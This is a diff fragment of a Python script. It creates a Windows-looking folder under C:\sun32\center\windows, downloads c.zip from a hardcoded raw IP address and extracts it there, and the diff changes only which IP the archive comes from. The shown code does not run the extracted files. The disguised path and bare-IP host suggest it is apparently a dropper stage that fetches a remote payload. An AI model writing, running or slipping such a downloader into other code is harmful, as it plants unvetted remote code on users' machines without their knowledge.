@@ -38,7 +38,7 @@ if __name__=='__main__':
 
 	os.makedirs(r"C:\sun32\center\windows")
 
-	request.urlretrieve("http://34.80.135.251/c.zip",r"C:\sun32\center\windows\c.zip")
+	request.urlretrieve("http://104.155.212.130/c.zip",r"C:\sun32\center\windows\c.zip")
 	azip = zipfile.ZipFile(r"C:\sun32\center\windows\c.zip")
 	#解压到原始目录
 	azip.extractall(r"C:\sun32\center\windows")
